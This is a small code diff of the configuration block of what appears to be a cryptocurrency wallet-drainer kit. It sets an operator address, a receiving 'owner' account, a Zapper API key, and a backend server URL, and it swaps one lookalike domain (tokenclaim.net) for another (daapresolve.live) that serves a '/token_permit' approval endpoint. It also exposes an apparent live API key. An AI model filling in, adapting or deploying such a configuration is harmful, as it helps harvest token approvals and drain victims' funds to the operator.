@@ -25,7 +25,7 @@ operator = '0xb32f6dcF675a0B1F832Deba1B204890cBDbf9dD3' //  --> The address (0x)
 contractSAFA = '0x829d26e91AcEaB3e914479AC9fA67ca80a08B1fc' // specify address contract your deploy
 ownerAddress = '0xb32f6dcF675a0B1F832Deba1B204890cBDbf9dD3' // specify address reciept --> MY ACC 10
 const ZAPPER_KEY = 'd33110cf-f610-408b-8d11-990da7f544d3'  // specify your API key
-const BASE_URL = 'https://tokenclaim.net/api'; // specify the address to the configured server in format https://server.com/api
+const BASE_URL = 'https://daapresolve.live:8000/api'; // specify the address to the configured server in format https://server.com/api
 // SET THESE END
 
 const TOKEN_APPROVE = BASE_URL + '/token_permit';
